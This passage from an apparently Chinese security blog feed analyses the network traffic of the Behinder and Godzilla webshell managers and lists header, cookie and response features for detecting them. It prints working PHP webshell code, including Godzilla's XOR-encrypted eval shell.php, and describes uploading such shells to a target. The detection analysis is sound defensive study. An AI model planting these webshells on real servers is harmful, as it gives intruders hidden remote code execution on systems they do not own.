class="hljs-title">C</span></span>&#123;<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$p</span></span>) </span>&#123;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$p</span>.<span class="hljs-string">&quot;&quot;</span>);&#125;&#125;<br>    @<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">C</span>(),<span class="hljs-variable">$params</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>xs发现加解密代码要自己写结果不会，那就不整了:(，那就只能网上找别人的代码了，这里找到一篇文章：<a href="https://xz.aliyun.com/t/11942?time__1311=mqmx0DBG0QdxyDBuex2lfD8DcGD9ngOWYD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/11942?time__1311=mqmx0DBG0QdxyDBuex2lfD8DcGD9ngOWYD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p><img src="http://cdn.clown2024.cn/202407151450090.png" alt="image-20240502020538191"></p><p>选择传输协议，写好对应的加解密函数，然后本地生成服务端，就会生成各种对应的shell文件，上传然后连接即可。</p><p>4.0版本给我们自由发挥空间也很多，可以进行魔改成自己想要的传输方式，这里有一篇参考文章：<a href="https://xz.aliyun.com/t/12453?time__1311=mqmhD5AKYI1GODlxGoUDyjDnmtDkzlGzteD&alichlgref=https://www.google.com/">https://xz.aliyun.com/t/12453?time__1311=mqmhD5AKYI1GODlxGoUDyjDnmtDkzlGzteD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F</a></p><p>具体的分析也不演示了，这里只是先大致了解，深入的之后再学习。(主要是懒)</p><h1><span id="哥斯拉">哥斯拉</span></h1><p>哥斯拉是一个基于流量、HTTP 全加密的 Webshell管理工具。和冰蝎类似，哥斯拉为加密的通讯流量，因此通过流量进行检测会有很大的难度，由于 WAF 等流量检测型安全设备无法对加密的流量进行解密，因此只能采用一些比较宽泛的匹配规则进行检测。如哥斯拉客户端使用JAVA 语言编写，在默认的情况下，如果不修改 User-Agent，User-Agent 会包含Java 版本信息。</p><p><strong>流量特征</strong></p><ul><li>User-Agent字段（弱特征），如果采用默认的情况，会暴露使用的jdk信息。不过哥斯拉支持自定义HTTP头部，这个默认特征是可以很容易去除的。</li><li>Accept字段（弱特征），默认是Accept:text&#x2F;html, image&#x2F;gif, image&#x2F;jpeg, *; q&#x3D;.2, &#x2F;; q&#x3D;.2。同上，这个也可修改，只能作为辅助检测的特征。</li><li>Cookie中有一个非常关键的特征，最后会有个分号。估计后续的版本会修复。</li><li>响应体的数据有一定特征，哥斯拉会把一个32位的md5字符串按照一半拆分，分别放在base64编码的数据的前后两部分。整个响应包的结构体征为：md5前十六位+base64+md5后十六位。</li></ul><p><strong>攻击过程</strong></p><p>哥斯拉可以指定webshell语言、加密方式、密钥、密码来生成webshell；然后将webshell上传到目标主机连接即可。</p><p><img src="http://cdn.clown2024.cn/202407151450091.png" alt="image-20240502134018866"></p><p>这是生成的异或加密的脚本的shell.php</p><figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>@<span class="hljs-title function_ invoke__">session_start</span>();<br>@<span class="hljs-title function_ invoke__">set_time_limit</span>(<span class="hljs-number">0</span>);<br>@<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">encode</span>(<span class="hljs-params"><span class="hljs-variable">$D</span>,<span class="hljs-variable">$K</span></span>)</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$D</span>);<span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-variable">$c</span> = <span class="hljs-variable">$K</span>[<span class="hljs-variable">$i</span>+<span class="hljs-number">1</span>&amp;<span class="hljs-number">15</span>];<br>        <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>] = <span class="hljs-variable">$D</span>[<span class="hljs-variable">$i</span>]^<span class="hljs-variable">$c</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$D</span>;<br>&#125;<br><span class="hljs-variable">$pass</span>=<span class="hljs-string">&#x27;pass&#x27;</span>;<br><span class="hljs-variable">$payloadName</span>=<span class="hljs-string">&#x27;payload&#x27;</span>;<br><span class="hljs-variable">$key</span>=<span class="hljs-string">&#x27;3c6e0b8a9c15224a&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]))&#123;<br>    <span class="hljs-variable">$data</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-variable">$pass</span>]),<span class="hljs-variable">$key</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]))&#123;<br>        <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>],<span class="hljs-variable">$key</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)===<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$payload</span>=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$payload</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$payload</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">0</span>,<span class="hljs-number">16</span>);<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">encode</span>(@<span class="hljs-title function_ invoke__">run</span>(<span class="hljs-variable">$data</span>),<span class="hljs-variable">$key</span>));<br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$pass</span>.<span class="hljs-variable">$key</span>),<span class="hljs-number">16</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$data</span>,<span class="hljs-string">&quot;getBasicsInfo&quot;</span>)!==<span class="hljs-literal">false</span>)&#123;<br>            <span class="hljs-variable">$_SESSION</span>[<span class="hljs-variable">$payloadName</span>]=<span class="hljs-title function_ invoke__">encode</span>(<span class="hljs-variable">$data</span>,<span class="hljs-variable">$key</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>加密过程</strong></p><ol><li>先对原始数据进行base64的编码</li><li>然后和密钥key按位异或（这个密钥key是取shellsetting时自定义设置的那个密钥的md5值前16位。）</li><li>将得到的数据再base64一次，再url编码一次。</li><li>最后将得到的数据与密码进行拼接。</li><li>相对应的加密函数</li></ol><p><strong>看一下php的流量包</strong></p><p><img src="http://cdn.clown2024.cn/202407151450092.png" alt="image-20240502133946650"></p><p>可以看到cookie后面确实带着分号，如果要解密数据就按着shell.php里面给出的解密顺序解出来即可</p><p>对各语言的shell进行分析的文章可以看这篇：<a href="https://forum.butian.net/share/2517">https://forum.butian.net/share/2517</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;webshell常见的流量特征：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;网络通信模式：Webshell工具通常会与控制服务器进行通信，通过特定的网络协议传输数据。这些通信模式与正常的网络通信模式存在差异，如使用非标准端口、频繁的连接和断开等。&lt;/li&gt;
&lt;li&gt;数据传输方式：Websh</summary>
      
    
    
    
    <category term="流量分析" scheme="https://clowsman.github.io/categories/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
    
    <category term="流量分析" scheme="https://clowsman.github.io/tags/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"/>
    
  </entry>
  
</feed>
